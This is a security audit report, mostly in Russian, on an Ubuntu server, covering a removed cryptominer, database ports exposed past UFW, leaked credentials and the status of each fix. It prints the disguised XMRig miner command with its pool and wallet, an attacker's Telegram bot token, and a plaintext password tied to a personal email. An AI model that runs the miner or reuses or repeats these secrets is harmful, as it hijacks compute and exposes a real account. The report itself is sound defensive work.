# Security Audit Report — Server 80.74.28.160 (aidevteam.ru)

**Date**: 2026-02-10
**Server**: 80.74.28.160 (a9262810921.fvds.ru)
**OS**: Ubuntu 24.04.3 LTS, Kernel 6.8.0-90-generic
**Uptime**: 58 days
**Domain**: cortex.aidevteam.ru

---

## Summary

| Severity | Count |
| -------- | ----- |
| CRITICAL | 4     |
| HIGH     | 3     |
| MEDIUM   | 2     |
| LOW/INFO | 4     |

---

## CRITICAL

### C1. КРИПТОМАЙНЕР ОБНАРУЖЕН И УБИТ

**Статус: ЛИКВИДИРОВАН**

В контейнере `aidevteam-app` (проект `/root/aidevteam`) был запущен криптомайнер Dogecoin (XMRig замаскированный под `syssls`):

```
./syssls -o stratum+ssl://rx.unmineable.com:443 -a rx -k
-u DOGE:DEk272RMv4Xsstc9hn2Xwzb3GxuSAPqN7H.test17 --cpu-max-threads-hint=100
```

**Детали атаки:**

- **Атакующий**: Индонезийский хакер (комменты на индонезийском языке)
- **Telegram бот для уведомлений**: `8060626306:AAHQugtRK_PR3RU14JYdD7EVf26MjV7JnVY` (chat ID: 1303861906)
- **Вектор**: Уязвимость в Next.js приложении внутри `aidevteam-app` контейнера
- **Persistence**: Скрипт `/tmp/sess` отправляет данные сервера атакующему, `m.tar.gz` — архив с майнером
- **Потребление**: 385% CPU, 2.3 GB RAM, вызывал OOM killer
- **OOM события**: Майнер убивался OOM killer, но перезапускался (видно в dmesg)

**Действия выполнены:**

- Процесс убит (kill -9)
- Контейнер перезапущен (чистый после рестарта)
- Файлы малвари удалены из container overlay и изнутри контейнера

**ТРЕБУЕТСЯ:** Найти и закрыть уязвимость в aidevteam-app (Next.js). Обновить образ контейнера.

### C2. PostgreSQL (zalogium) ДОСТУПЕН ИЗ ИНТЕРНЕТА

`zalogium-postgres` контейнер привязан к `0.0.0.0:5432`. Хотя UFW имеет правило `DENY 5432`, **Docker модифицирует iptables напрямую и обходит UFW**.

```
iptables DNAT: 0.0.0.0/0 → 172.18.0.2:5432 (tcp dpt:5432)
```

Любой в интернете может подключиться к PostgreSQL на порту 5432.

**Fix:** В `docker-compose.yml` для zalogium:

```yaml
ports:
  - '127.0.0.1:5432:5432' # вместо "5432:5432"
```

### C3. Redis (zalogium) ДОСТУПЕН ИЗ ИНТЕРНЕТА

Аналогичная проблема: `zalogium-redis` на `0.0.0.0:6379`.

```
iptables DNAT: 0.0.0.0/0 → 172.18.0.3:6379 (tcp dpt:6379)
```

**Fix:** Привязать к `127.0.0.1:6379:6379`.

### C4. Утечка учётных данных в /tmp

Файл `/tmp/clawdbot-env-fix.sh` содержит:

```
GOG_KEYRING_PASSWORD=arvis123
GOG_ACCOUNT=maslennikov.ig@gmail.com
```

**Fix:** Удалить файл. Сменить пароль GOG-аккаунта.

---

## HIGH

### H1. 66 ожидающих обновлений безопасности

Включая:

- **Linux kernel**: 6.8.0-90 (устарел)
- **Docker CE**: 29.1.3 (устарел)
- Системные библиотеки

### H2. Swap 90% заполнен (1.8 / 2.0 GB)

Сервер с 8 GB RAM тянет огромную нагрузку:

- Mailcow (почтовый сервер) с ClamAV (910 MB RAM!)
- n8n (automation)
- Cortex (бот + backend + worker + beat + frontend)
- Zalogium
- ArinAI
- Aidevteam
- Amnezia VPN
- Tailscale VPN
- PSK-dom-bot

Слишком много для 8 GB.

### H3. Дубликаты SSH-ключей в authorized_keys

3 идентичных ключа `ssh-ed25519 ...PPLNOuDM0...` добавлены в root authorized_keys.

---

## MEDIUM

### M1. aidevteam-app уязвим к RCE

Контейнер `aidevteam-app` (Next.js приложение) был скомпрометирован через выполнение произвольного кода. Необходимо:

- Обновить Next.js и все зависимости
- Проверить наличие SSRF/RCE уязвимостей
- Рассмотреть запуск контейнера с `--read-only` и `--security-opt no-new-privileges`

### M2. ClamAV потребляет 910 MB RAM

Для сервера с 8 GB RAM это много. Можно переключить на периодическое сканирование вместо daemon mode.

---

## LOW / INFO

### L1. SSH уже захардненл (key-only, MaxAuthTries 3)

### L2. Fail2ban активен (4 jail, 3109 бан, 24079 неудачных попыток)

### L3. Amnezia VPN работает (amnezia-xray на порту 8443)

### L4. Tailscale VPN работает (100.79.22.3)

---

## Приоритет действий — РЕЗУЛЬТАТ

| #   | Действие                                              | Severity | Статус                           |
| --- | ----------------------------------------------------- | -------- | -------------------------------- |
| 1   | Криптомайнер убит + файлы удалены                     | CRITICAL | DONE                             |
| 2   | PostgreSQL zalogium привязать к 127.0.0.1             | CRITICAL | DONE                             |
| 3   | Redis zalogium привязать к 127.0.0.1                  | CRITICAL | DONE                             |
| 4   | Удалить /tmp/clawdbot-env-fix.sh + сменить пароль GOG | CRITICAL | DONE (файл) / TODO (пароль GOG)  |
| 5   | Security updates + reboot                             | HIGH     | DONE (kernel 6.8.0-100, 65 pkgs) |
| 6   | Пересобрать aidevteam-app (чистый образ)              | MEDIUM   | DONE                             |
| 7   | Удалить дубликаты SSH-ключей                          | HIGH     | DONE (8→6 уникальных)            |
| 8   | SSH hardening (key-only, no password)                 | HIGH     | DONE                             |
